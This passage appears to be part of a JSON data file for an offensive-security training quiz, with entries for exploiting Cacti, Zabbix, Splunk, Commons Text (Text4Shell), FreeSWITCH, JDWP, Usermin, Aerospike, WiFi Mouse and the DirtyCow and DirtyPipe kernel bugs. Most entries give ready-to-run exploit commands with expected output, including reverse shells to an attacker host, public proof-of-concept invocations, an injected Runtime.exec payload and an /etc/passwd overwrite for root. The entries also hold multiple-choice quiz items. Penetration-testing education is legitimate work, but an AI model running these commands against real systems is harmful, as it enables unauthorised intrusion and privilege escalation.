              "out": "1.2.22",
              "sig": "1.2.22",
              "teach": "1.2.22 and below carry the remote_agent.php injection."
            }
          ]
        },
        {
          "key": "endpoint",
          "label": "remote_agent.php is reachable",
          "steps": [
            {
              "title": "Check the injectable script",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://{{target}}/cacti/remote_agent.php",
              "out": "200",
              "sig": "200",
              "teach": "remote_agent.php is the injectable endpoint and it answers without a login."
            }
          ]
        }
      ],
      "how": {
        "lead": "Cacti injection is confirm 1.2.22 or below, then fire the public script that spoofs X-Forwarded-For and injects your command.",
        "items": [
          {
            "t": "Confirm the version",
            "d": "The CHANGELOG names the version; 1.2.22 and below are vulnerable.",
            "demo": [
              {
                "run": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
                "out": "1.2.22",
                "sig": "1.2.22"
              }
            ],
            "note": "A newer Cacti fixed the address check."
          },
          {
            "t": "Start your listener",
            "d": "The injected command is a reverse shell, so have the listener ready.",
            "demo": [
              {
                "run": "nc -lvnp 4444",
                "out": "listening on [any] 4444 ...",
                "sig": "listening on"
              }
            ],
            "note": "The shell lands as the web user."
          },
          {
            "t": "Fire the injection",
            "d": "The public script spoofs X-Forwarded-For to an authorised poller and injects the command.",
            "demo": [
              {
                "run": "python3 CVE-2022-46169.py -u http://{{target}}/cacti -c 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1'",
                "out": "[+] Triggering reverse shell",
                "sig": "Triggering reverse shell"
              }
            ],
            "note": "Catch the shell, then enumerate the host for privilege escalation."
          }
        ]
      },
      "situation": "Cacti's CHANGELOG shows version 1.2.22 and remote_agent.php is reachable. What is the move?",
      "choices": [
        "cacti-cmdinjection",
        "command-injection",
        "content-discovery",
        "online-brute-ftp"
      ],
      "coach": {
        "command-injection": "This is the specific remote_agent.php CVE with an X-Forwarded-For spoof precondition, not a generic app input.",
        "content-discovery": "The endpoint and version are known; fire the exploit.",
        "online-brute-ftp": "Wrong service entirely; the shell is through the Cacti web app."
      }
    },
    "zabbix-script-rce": {
      "why": "Zabbix is a monitoring platform whose frontend, when SAML single sign-on is enabled, trusts an unsigned session cookie, so you can forge an Admin session with no password. That matters because Zabbix has a built-in Scripts feature that runs operating-system commands on the server or on the agents it monitors, by design. So an admin takeover becomes code execution. Confirm the frontend and SSO, forge the cookie to land as Admin, then add a script that is a reverse shell and run it on a host.",
      "cmd": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
      "tool": "curl",
      "output": "<title>Zabbix SIA</title>",
      "signal": "Zabbix",
      "teach": "The Zabbix frontend is present. If SAML SSO is enabled, forge the unsigned session cookie for Admin, then use Administration Scripts to run a reverse shell on a monitored host.",
      "leadup": [
        {
          "key": "frontend",
          "label": "The Zabbix frontend is up",
          "steps": [
            {
              "title": "Confirm the frontend",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
              "out": "<title>Zabbix SIA</title>",
              "sig": "Zabbix",
              "teach": "The frontend is the attack surface; next check whether SSO is enabled."
            }
          ]
        },
        {
          "key": "sso",
          "label": "SAML SSO is enabled",
          "steps": [
            {
              "title": "Look for the SSO entry point",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://{{target}}/zabbix/index_sso.php",
              "out": "200",
              "sig": "200",
              "teach": "An SSO login page present means the unsigned-cookie forgery applies."
            }
          ]
        }
      ],
      "how": {
        "lead": "Zabbix RCE is confirm SSO, forge the Admin cookie, then add and run a Scripts entry that is a reverse shell.",
        "items": [
          {
            "t": "Confirm the frontend and SSO",
            "d": "The forgery needs SAML SSO; a present SSO login page is the precondition.",
            "demo": [
              {
                "run": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
                "out": "<title>Zabbix SIA</title>",
                "sig": "Zabbix"
              }
            ],
            "note": "Without SSO this path does not apply; look for default credentials instead."
          },
          {
            "t": "Forge the Admin session",
            "d": "A public PoC crafts the unsigned zbx_session cookie for Admin, so the dashboard loads with no password.",
            "demo": [
              {
                "run": "python3 zabbix-saml-bypass.py -u http://{{target}}/zabbix",
                "out": "[+] Forged session for Admin",
                "sig": "Forged session for Admin"
              }
            ],
            "note": "You are now Admin in the frontend, with the Scripts feature available."
          },
          {
            "t": "Run a Script on a host",
            "d": "Administration Scripts runs OS commands on the server or agents; add one that is a reverse shell and execute it.",
            "demo": [
              {
                "run": "# Administration > Scripts: new script 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1', then run it on a monitored host",
                "out": "(no body; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the shell is the Zabbix server or agent user."
          }
        ]
      },
      "situation": "The Zabbix frontend is reachable and its SAML SSO login page is present. What is the move?",
      "choices": [
        "zabbix-script-rce",
        "sqli-basics",
        "content-discovery",
        "online-brute-ssh"
      ],
      "coach": {
        "sqli-basics": "The path is an auth bypass plus the built-in Scripts feature, not a SQL parameter.",
        "content-discovery": "The app and SSO are already identified; forge the cookie and use Scripts.",
        "online-brute-ssh": "Wrong service; the RCE is through the Zabbix web frontend."
      }
    },
    "splunk-app-rce": {
      "why": "Splunk runs the scripts that ship inside an installed app as its own service user, which means anyone who can install an app can run code. You package a tiny app whose scripted input is a reverse shell, upload it through the web UI or the REST API, and Splunk fires it. Uploading normally needs a login, though on 9.0.x and 9.1.x CVE-2023-46214 opens a lower-privilege route to the same result. Confirm the version on the management port, build the app, and upload it.",
      "cmd": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
      "tool": "curl",
      "output": "<version>9.1.0</version>",
      "signal": "9.1.0",
      "teach": "Splunk 9.1.0 is reachable on the management port. Package an app whose scripted input is a reverse shell and upload it; Splunk runs it as the splunk user.",
      "leadup": [
        {
          "key": "version",
          "label": "The Splunk version is known",
          "steps": [
            {
              "title": "Read the version from the REST API",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
              "out": "<version>9.1.0</version>",
              "sig": "9.1.0",
              "teach": "9.0.x and 9.1.x also carry the lower-privilege CVE-2023-46214 path."
            }
          ]
        },
        {
          "key": "mgmt",
          "label": "The management port answers",
          "steps": [
            {
              "title": "Confirm Splunkd",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p8089 -sV {{target}}",
              "out": "8089/tcp open  ssl/http Splunkd httpd",
              "sig": "8089/tcp open",
              "teach": "8089 is Splunkd and 8000 is the web UI; either can accept an app upload with the right access."
            }
          ]
        }
      ],
      "how": {
        "lead": "Splunk app RCE is confirm the version, build an app with a scripted-input reverse shell, upload it, and catch the splunk-user shell.",
        "items": [
          {
            "t": "Confirm the version",
            "d": "The management REST endpoint reports the version without a login.",
            "demo": [
              {
                "run": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
                "out": "<version>9.1.0</version>",
                "sig": "9.1.0"
              }
            ],
            "note": "9.0.x and 9.1.x also expose the lower-privilege CVE-2023-46214 path."
          },
          {
            "t": "Build the malicious app",
            "d": "A small app with a scripted input that calls back is all you need; edit the host and port, then package it.",
            "demo": [
              {
                "run": "git clone https://github.com/0xjpuff/reverse_shell_splunk && tar czf rev.tar.gz reverse_shell_splunk",
                "out": "reverse_shell_splunk/bin/rev.py",
                "sig": "reverse_shell_splunk"
              }
            ],
            "note": "Set the LHOST and LPORT in the app's script before packaging."
          },
          {
            "t": "Upload and catch the shell",
            "d": "Install the app through Manage Apps or the REST apps endpoint; Splunk runs its scripted input.",
            "demo": [
              {
                "run": "# Manage Apps > Install app from file > rev.tar.gz (or the REST apps/local endpoint)",
                "out": "(app installed; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the scripted input runs as the splunk user."
          }
        ]
      },
      "situation": "Splunkd answers on 8089 and reports version 9.1.0, and you can reach Manage Apps. What is the move?",
      "choices": [
        "splunk-app-rce",
        "content-discovery",
        "online-brute-ssh",
        "sqli-basics"
      ],
      "coach": {
        "content-discovery": "The service and upload path are known; package and install the app.",
        "online-brute-ssh": "Wrong service; the code execution is through a Splunk app, not SSH.",
        "sqli-basics": "No database input; Splunk runs your app's bundled script directly."
      }
    },
    "text4shell": {
      "why": "Apache Commons Text is a Java string library, and versions 1.5 through 1.9 evaluate interpolations inside its StringSubstitutor, including ones that run a script, fetch a URL, or resolve DNS. If a web app passes a request parameter through that substitutor, your interpolation runs on the server, which is remote code execution. The work is finding the reflected parameter, often a search box, confirming it evaluates with an out-of-band callback, then swapping in a reverse shell. URL-encode the payload so special characters survive the request.",
      "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
      "tool": "curl",
      "output": "(no body; a request hits your listener at /hit)",
      "signal": "/hit",
      "teach": "A callback to your box from the url interpolation proves the parameter reaches a vulnerable Commons Text. Swap it for a script interpolation to run a command, then a reverse shell.",
      "leadup": [
        {
          "key": "param",
          "label": "A reflected parameter exists",
          "steps": [
            {
              "title": "Find a parameter the app processes",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=test'",
              "out": "Results for: test",
              "sig": "Results for: test",
              "teach": "Any parameter whose value is handled server-side, like a search box, is the candidate to test."
            }
          ]
        },
        {
          "key": "callback",
          "label": "The interpolation evaluates",
          "steps": [
            {
              "title": "Send an out-of-band url payload",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
              "out": "(no body; a request hits your listener at /hit)",
              "sig": "/hit",
              "teach": "A hit on your listener means the parameter flows into the vulnerable substitutor."
            }
          ]
        }
      ],
      "how": {
        "lead": "Text4Shell is find the reflected parameter, confirm with an out-of-band url interpolation, then run a command with a script interpolation.",
        "items": [
          {
            "t": "Find a reflected parameter",
            "d": "Probe parameters whose value the app processes; a search box is the usual one.",
            "demo": [
              {
                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=test'",
                "out": "Results for: test",
                "sig": "Results for: test"
              }
            ],
            "note": "You are looking for input that reaches server-side string handling."
          },
          {
            "t": "Confirm with an out-of-band callback",
            "d": "A url interpolation makes the server fetch your box, which proves evaluation without needing the response.",
            "demo": [
              {
                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
                "out": "(no body; a request hits your listener at /hit)",
                "sig": "/hit"
              }
            ],
            "note": "Run a listener on {{lhost}} first; a hit confirms the interpolation runs."
          },
          {
            "t": "Run a command, then a shell",
            "d": "Switch to a script interpolation to execute a command, confirm with id, then stage a reverse shell.",
            "demo": [
              {
                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}'",
                "out": "uid=1000(app) gid=1000(app)",
                "sig": "uid=1000(app)"
              }
            ],
            "note": "With execution confirmed, stage a reverse shell the same way."
          }
        ]
      },
      "situation": "A search parameter on a Java app triggers an out-of-band HTTP callback when you send a url interpolation payload. What is the move?",
      "choices": [
        "text4shell",
        "ssti",
        "command-injection",
        "check-log4shell"
      ],
      "coach": {
        "ssti": "Close in spirit, but this is specifically Commons Text interpolation, confirmed by the url callback.",
        "command-injection": "The injection is into a Java interpolation layer, not a shell metacharacter in app input.",
        "check-log4shell": "Log4Shell is JNDI in Log4j; these interpolations are Commons Text, a different library."
      }
    },
    "freeswitch-esl": {
      "why": "FreeSWITCH is an open-source phone system, and its event socket on port 8021 is an administrative control channel. The problem is the default install: the password is ClueCon and there is frequently no access-control list, so any client that sends that password can drive the server, including running operating-system commands through its API. On a Windows host the FreeSWITCH service often runs with high privilege, so the shell can be powerful. Confirm the default password is accepted, then issue a system command.",
      "cmd": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
      "tool": "nc",
      "output": "+OK accepted\n+OK\nUP 0 years, 0 days, 1 hour, 2 minutes",
      "signal": "+OK accepted",
      "teach": "The socket accepted the default ClueCon password, so you can drive the API. The api system command runs OS commands; whoami shows the context, then stage a reverse shell.",
      "leadup": [
        {
          "key": "auth",
          "label": "The default password is accepted",
          "steps": [
            {
              "title": "Send the default login",
              "tool": "nc",
              "where": "local",
              "cmd": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
              "out": "+OK accepted\n+OK\nUP 0 years",
              "sig": "+OK accepted",
              "teach": "A default ClueCon login with no ACL is the whole vulnerability."
            }
          ]
        },
        {
          "key": "port",
          "label": "The event socket is open",
          "steps": [
            {
              "title": "See the open port",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p8021 -sV {{target}}",
              "out": "8021/tcp open  freeswitch-event",
              "sig": "8021/tcp open",
              "teach": "Port 8021 is the FreeSWITCH event socket; the default-password check comes next."
            }
          ]
        }
      ],
      "how": {
        "lead": "FreeSWITCH ESL is confirm the default password, run whoami through the API, then stage a reverse shell with api system.",
        "items": [
          {
            "t": "Confirm the default login",
            "d": "Send auth ClueCon and an api status; a reply means the socket is open to you.",
            "demo": [
              {
                "run": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
                "out": "+OK accepted",
                "sig": "+OK accepted"
              }
            ],
            "note": "No ACL plus the default password means the API is yours."
          },
          {
            "t": "Check the execution context",
            "d": "The api system command runs an OS command and returns its output.",
            "demo": [
              {
                "run": "printf 'auth ClueCon\\n\\napi system whoami\\n\\n' | nc -nv {{target}} 8021",
                "out": "+OK\nfreeswitch",
                "sig": "freeswitch"
              }
            ],
            "note": "On Windows this is often the high-privilege service account."
          },
          {
            "t": "Stage a reverse shell",
            "d": "Run a reverse-shell command through the API and catch it.",
            "demo": [
              {
                "run": "python3 47799.py {{target}} 'nc {{lhost}} 4444 -e /bin/sh'",
                "out": "(no body; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the api system command runs it."
          }
        ]
      },
      "situation": "Port 8021 is open and sending the ClueCon password returns +OK accepted. What is the move?",
      "choices": [
        "freeswitch-esl",
        "online-brute-ssh",
        "recon-web-triage",
        "content-discovery"
      ],
      "coach": {
        "online-brute-ssh": "No brute needed; the default password is already accepted on the event socket.",
        "recon-web-triage": "This is not a web app; it is the FreeSWITCH control socket, which runs OS commands directly.",
        "content-discovery": "Nothing to discover on an HTTP server here; the socket itself is the exploit."
      }
    },
    "jdwp-debug": {
      "why": "The Java Debug Wire Protocol lets a developer attach a debugger to a running Java process and, among other things, invoke methods. Anyone who can reach the port can do the same, so an exposed JDWP port is code execution as the user running the JVM. These ports are often bound to localhost for local debugging, which means you usually reach them only after you have a foothold and can pivot. Confirm the port with the JDWP handshake, then a tool invokes your command inside the JVM.",
      "cmd": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
      "tool": "nc",
      "output": "JDWP-Handshake",
      "signal": "JDWP-Handshake",
      "teach": "The port echoed JDWP-Handshake, so it speaks the debug protocol. jdwp-shellifier will invoke a command in the JVM; if the port is localhost-only, reach it through a tunnel.",
      "leadup": [
        {
          "key": "handshake",
          "label": "The port speaks JDWP",
          "steps": [
            {
              "title": "Send the handshake",
              "tool": "nc",
              "where": "local",
              "cmd": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
              "out": "JDWP-Handshake",
              "sig": "JDWP-Handshake",
              "teach": "An echo of the handshake confirms a live debug port you can attach to."
            }
          ]
        },
        {
          "key": "pivot",
          "label": "The port is reachable, often via a pivot",
          "steps": [
            {
              "title": "Reach a localhost-bound port through the tunnel",
              "tool": "proxychains",
              "where": "local",
              "cmd": "proxychains nc -nv 127.0.0.1 8000",
              "out": "127.0.0.1 8000 port [tcp/*] succeeded",
              "sig": "8000 port",
              "teach": "JDWP is commonly bound to localhost; a SOCKS pivot reaches it from your box."
            }
          ]
        }
      ],
      "how": {
        "lead": "JDWP is confirm the handshake, clone jdwp-shellifier, then inject a command that runs as the JVM user.",
        "items": [
          {
            "t": "Confirm the debug port",
            "d": "Send the JDWP handshake; the server echoes it when the port speaks the protocol.",
            "demo": [
              {
                "run": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
                "out": "JDWP-Handshake",
                "sig": "JDWP-Handshake"
              }
            ],
            "note": "No echo means it is not JDWP, or you cannot reach it yet."
          },
          {
            "t": "Get the tool",
            "d": "jdwp-shellifier attaches, sets a breakpoint, and invokes a command; it needs python2.",
            "demo": [
              {
                "run": "git clone https://github.com/IOActive/jdwp-shellifier",
                "out": "Cloning into 'jdwp-shellifier'...",
                "sig": "jdwp-shellifier"
              }
            ],
            "note": "Run it with python2, not python3."
          },
          {
            "t": "Inject a command",
            "d": "Point the tool at the port with your command; it runs inside the JVM as its user.",
            "demo": [
              {
                "run": "python2 jdwp-shellifier.py -t {{target}} -p 8000 --cmd 'busybox nc {{lhost}} 4444 -e /bin/bash'",
                "out": "[+] Command string object created id:9a0",
                "sig": "Command string object created"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the shell is the JVM user."
          }
        ]
      },
      "situation": "A port returns the string JDWP-Handshake when you send the handshake. What is the move?",
      "choices": [
        "jdwp-debug",
        "recon-web-triage",
        "online-brute-ssh",
        "sqli-basics"
      ],
      "coach": {
        "recon-web-triage": "This is a debug protocol, not HTTP; attach to the JVM and invoke a method.",
        "online-brute-ssh": "No credentials are involved; the debug port is open by definition.",
        "sqli-basics": "No database input; the execution happens inside the Java process."
      }
    },
    "usermin-rce": {
      "why": "Usermin is the single-user sibling of Webmin, built on the same MiniServ server and usually on port 20000. Vulnerable versions up to 1.820 let an authenticated user run commands through a built-in module, so unlike the Webmin password-reset backdoor this one needs a valid login first. On these targets the login is almost always a credential you already recovered, often a username and password reused from anonymous FTP or a looted config file. Confirm Usermin, bring a login, then the proof of concept turns that login into a shell.",
      "cmd": "curl -sk https://{{target}}:20000/ | grep -i usermin",
      "tool": "curl",
      "output": "<title>Login to Usermin</title>",
      "signal": "Usermin",
      "teach": "Usermin is on 20000 and vulnerable at or below 1.820. With a valid login, usually a reused credential, the module RCE gives you a shell as that user.",
      "leadup": [
        {
          "key": "present",
          "label": "Usermin is confirmed on 20000",
          "steps": [
            {
              "title": "Confirm the panel",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sk https://{{target}}:20000/ | grep -i usermin",
              "out": "<title>Login to Usermin</title>",
              "sig": "Usermin",
              "teach": "Usermin on 20000 banners its login; read the version from the footer (vulnerable at or below 1.820)."
            }
          ]
        },
        {
          "key": "creds",
          "label": "You hold a reused credential",
          "steps": [
            {
              "title": "Test a looted login",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sk 'https://{{target}}:20000/session_login.cgi' --data 'user=bob&pass=Autumn2026!' -c c.txt -o /dev/null -w '%{http_code}\\n'",
              "out": "302",
              "sig": "302",
              "teach": "A 302 redirect after login means the reused credential worked; a 200 back to the form means it failed."
            }
          ]
        }
      ],
      "how": {
        "lead": "Usermin RCE is confirm the version on 20000, get a valid login, then run the PoC with those creds.",
        "items": [
          {
            "t": "Confirm Usermin and the version",
            "d": "Banner the login page and read the version; vulnerable at or below 1.820.",
            "demo": [
              {
                "run": "curl -sk https://{{target}}:20000/ | grep -i usermin",
                "out": "<title>Login to Usermin</title>",
                "sig": "Usermin"
              }
            ],
            "note": "A newer build patched the module RCE, so the version matters."
          },
          {
            "t": "Bring a valid login",
            "d": "The RCE is authenticated, so you need working creds, usually a reused pair you looted elsewhere.",
            "demo": [
              {
                "run": "curl -sk 'https://{{target}}:20000/session_login.cgi' --data 'user=bob&pass=Autumn2026!' -c c.txt -o /dev/null -w '%{http_code}\\n'",
                "out": "302",
                "sig": "302"
              }
            ],
            "note": "A 302 means the login worked; a 200 back to the form means it did not."
          },
          {
            "t": "Run the exploit",
            "d": "Feed the working credential to the PoC with your listener details.",
            "demo": [
              {
                "run": "python3 50234.py --host {{target}} --login bob --password 'Autumn2026!' --reverse-ip {{lhost}} --reverse-port 4444",
                "out": "(no body; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the shell is the Usermin user."
          }
        ]
      },
      "situation": "Usermin answers on 20000 at version 1.820 and you recovered a working login from a config file. What is the move?",
      "choices": [
        "usermin-rce",
        "webmin-rce",
        "online-brute-rdp",
        "content-discovery"
      ],
      "coach": {
        "webmin-rce": "That is the unauthenticated Webmin path on 10000; Usermin on 20000 needs a login, which you have.",
        "online-brute-rdp": "Wrong service; you already hold a valid Usermin credential, so use the authenticated RCE.",
        "content-discovery": "The service and version are known and you have creds; run the exploit."
      }
    },
    "aerospike-udf": {
      "why": "Aerospike is a fast key-value database, and versions up to 5.1.0.6 let an unauthenticated client register a user-defined function written in Lua. Those UDFs can call out to the operating system, so registering a malicious one and invoking it runs commands as the aerospike service user. The database listens on ports 3000 to 3003, and you often spot it because a web application names Aerospike as its backend. Reach the port, run the public proof of concept to register and fire the UDF, and catch a shell.",
      "cmd": "nc -nv {{target}} 3000",
      "tool": "nc",
      "output": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
      "signal": "3000 port",
      "teach": "Aerospike is reachable on 3000. If it is at or below 5.1.0.6, register a Lua UDF that runs a command, invoke it, and you have a shell as the aerospike user.",
      "leadup": [
        {
          "key": "reachable",
          "label": "The database port answers",
          "steps": [
            {
              "title": "Touch the Aerospike port",
              "tool": "nc",
              "where": "local",
              "cmd": "nc -nv {{target}} 3000",
              "out": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
              "sig": "3000 port",
              "teach": "Aerospike uses 3000 to 3003; the info protocol answers there."
            }
          ]
        },
        {
          "key": "backend",
          "label": "A web app names Aerospike",
          "steps": [
            {
              "title": "Spot the backend fingerprint",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s http://{{target}}/ | grep -i aerospike",
              "out": "<!-- backend: aerospike cluster -->",
              "sig": "aerospike",
              "teach": "The app often names its database; that fingerprint points you at the 3000 service."
            }
          ]
        }
      ],
      "how": {
        "lead": "Aerospike UDF is confirm the service, clone the PoC, then register and invoke a Lua UDF that runs your command.",
        "items": [
          {
            "t": "Confirm the service",
            "d": "The Aerospike info protocol answers on 3000 to 3003.",
            "demo": [
              {
                "run": "nc -nv {{target}} 3000",
                "out": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
                "sig": "3000 port"
              }
            ],
            "note": "A web app that names Aerospike as a backend is the usual way you find it."
          },
          {
            "t": "Get the PoC",
            "d": "The public exploit registers a Lua UDF that executes a command.",
            "demo": [
              {
                "run": "git clone https://github.com/b4ny4n/CVE-2020-13151",
                "out": "Cloning into 'CVE-2020-13151'...",
                "sig": "CVE-2020-13151"
              }
            ],
            "note": "Vulnerable at or below Aerospike 5.1.0.6."
          },
          {
            "t": "Register and fire the UDF",
            "d": "Run the exploit with your listener; it registers the UDF and invokes it.",
            "demo": [
              {
                "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport 4444 --command rev",
                "out": "(no body; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the UDF runs as the aerospike user."
          }
        ]
      },
      "situation": "A web app names Aerospike as its backend and port 3000 is open. What is the move?",
      "choices": [
        "aerospike-udf",
        "mongo-enum",
        "redis-enum",
        "sqli-basics"
      ],
      "coach": {
        "mongo-enum": "Wrong database; this is Aerospike on 3000 with a Lua UDF code-execution path.",
        "redis-enum": "Redis is 6379; Aerospike's UDF registration is the execution primitive here.",
        "sqli-basics": "The execution is through a registered UDF, not a SQL injection in the app."
      }
    },
    "wifi-mouse-rce": {
      "why": "WiFi Mouse is an app that turns a phone into a mouse and keyboard for a desktop, and its Mouse Server listens on port 1978. The flaw is that it checks whether the client is the official app entirely on the client side, which an attacker simply ignores. So file-execution events can be sent to the server with no authentication, and they run a program as the logged-in desktop user. Confirm the port is the Mouse Server, then the public proof of concept drops and runs a reverse shell.",
      "cmd": "nc -nv {{target}} 1978",
      "tool": "nc",
      "output": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
      "signal": "1978 port",
      "teach": "The Mouse Server is answering on 1978. Its auth is client-side only, so the PoC sends unauthenticated file-exec events to run a reverse shell as the desktop user.",
      "leadup": [
        {
          "key": "port",
          "label": "The Mouse Server port answers",
          "steps": [
            {
              "title": "Touch the control port",
              "tool": "nc",
              "where": "local",
              "cmd": "nc -nv {{target}} 1978",
              "out": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
              "sig": "1978 port",
              "teach": "The control port answering confirms the target app is present."
            }
          ]
        },
        {
          "key": "banner",
          "label": "nmap flags the port",
          "steps": [
            {
              "title": "Scan the port",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p1978 -sV {{target}}",
              "out": "1978/tcp open  unknown",
              "sig": "1978/tcp open",
              "teach": "An open 1978 with a desktop-control app behind it is the WiFi Mouse server."
            }
          ]
        }
      ],
      "how": {
        "lead": "WiFi Mouse RCE is confirm the Mouse Server on 1978, then run the PoC that sends unauthenticated file-exec events.",
        "items": [
          {
            "t": "Confirm the port",
            "d": "The Mouse Server answering on 1978 is enough; there is no login to get past.",
            "demo": [
              {
                "run": "nc -nv {{target}} 1978",
                "out": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
                "sig": "1978 port"
              }
            ],
            "note": "Authentication is entirely client-side, so the server trusts you."
          },
          {
            "t": "Run the exploit",
            "d": "The PoC sends the file-execution events that drop and run a reverse shell.",
            "demo": [
              {
                "run": "python3 50972.py {{target}} {{lhost}} 4444",
                "out": "(no body; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the shell is the logged-in desktop user."
          }
        ]
      },
      "situation": "Port 1978 is open and belongs to the WiFi Mouse Mouse Server. What is the move?",
      "choices": [
        "wifi-mouse-rce",
        "online-brute-rdp",
        "recon-vnc",
        "content-discovery"
      ],
      "coach": {
        "online-brute-rdp": "No login exists to brute; the server trusts the client, so execution is unauthenticated.",
        "recon-vnc": "Wrong remote-desktop service; this is the WiFi Mouse control port with a code-execution bug.",
        "content-discovery": "Not a web server; the Mouse Server protocol itself carries the exploit."
      }
    },
    "dirtycow": {
      "why": "DirtyCow is a race condition in how the Linux kernel handles copy-on-write memory, present on kernels below 4.8.3. By racing two operations you can write to a file you should only be able to read, and the classic payloads either add a root line to /etc/passwd or overwrite a SUID binary, both ending at root. It is a post-foothold local escalation you reach for when the misconfiguration paths are exhausted, and it can be unstable, so snapshot the box if the environment allows. Check the kernel, compile the staged exploit on the target, and run it.",
      "cmd": "uname -r",
      "tool": "cmd",
      "output": "4.4.0-116-generic",
      "signal": "4.4.0",
      "teach": "The kernel is 4.4.0, below the 4.8.3 fix, so DirtyCow applies. Compile the /etc/passwd variant on the target and run it, then su to the new root user.",
      "leadup": [
        {
          "key": "kernel",
          "label": "The kernel is below 4.8.3",
          "steps": [
            {
              "title": "Read the kernel version",
              "tool": "cmd",
              "where": "target",
              "cmd": "uname -r",
              "out": "4.4.0-116-generic",
              "sig": "4.4.0",
              "teach": "Below 4.8.3 is vulnerable; newer kernels are patched."
            }
          ]
        },
        {
          "key": "shell",
          "label": "You have a Linux foothold",
          "steps": [
            {
              "title": "Confirm your unprivileged shell",
              "tool": "cmd",
              "where": "target",
              "cmd": "id",
              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
              "sig": "uid=1000(bob)",
              "teach": "DirtyCow is a local escalation, so you need a shell on the box first."
            }
          ]
        }
      ],
      "how": {
        "lead": "DirtyCow is confirm the kernel is below 4.8.3, compile the staged PoC on the target, run it, then take root.",
        "items": [
          {
            "t": "Check the kernel",
            "d": "uname -r names the kernel; DirtyCow is reliable only below 4.8.3.",
            "demo": [
              {
                "run": "uname -r",
                "out": "4.4.0-116-generic",
                "sig": "4.4.0"
              }
            ],
            "note": "Newer kernels are patched; do not risk the unstable race for nothing."
          },
          {
            "t": "Compile on the target",
            "d": "Build the staged exploit with a C compiler on the box, or compile for the same architecture and transfer it.",
            "demo": [
              {
                "run": "gcc -pthread dirtycow.c -o /tmp/dcow -lcrypt",
                "out": "dirtycow.c compiled to /tmp/dcow",
                "sig": "/tmp/dcow"
              }
            ],
            "note": "The passwd variant and the SUID variant both reach root; pick whichever the box supports."
          },
          {
            "t": "Run it and take root",
            "d": "Run the exploit; the passwd variant adds a root user you then switch to.",
            "demo": [
              {
                "run": "/tmp/dcow",
                "out": "Backing up /etc/passwd to /tmp/passwd.bak\nAdded root user firefart",
                "sig": "firefart"
              }
            ],
            "note": "su firefart with the password it set; then capture proof."
          }
        ]
      },
      "situation": "You have a shell on a Linux box and uname -r shows 4.4.0-116-generic. What is the move?",
      "choices": [
        "dirtycow",
        "linux-kernel-exploit",
        "sudo-abuse",
        "suid-gtfobins"
      ],
      "coach": {
        "linux-kernel-exploit": "That is the general approach; here the exact kernel points at DirtyCow specifically.",
        "sudo-abuse": "Worth checking, but a kernel below 4.8.3 is a direct DirtyCow candidate when sudo gives you nothing.",
        "suid-gtfobins": "A SUID path is a fine parallel lead; the kernel version makes DirtyCow the named exploit."
      }
    },
    "dirtypipe": {
      "why": "DirtyPipe is a Linux kernel bug on versions 5.8 through 5.16.11 that lets an unprivileged user write into the page cache of a file they can only read, including read-only and SUID binaries. The reliable payload overwrites a SUID binary like su with a tiny stub that drops a root shell, then restores the original. It is more stable than DirtyCow and is a post-foothold local escalation. Confirm the kernel version, compile the staged exploit on the target, and point it at a SUID binary.",
      "cmd": "uname -r",
      "tool": "cmd",
      "output": "5.10.0-11-amd64",
      "signal": "5.10.0",
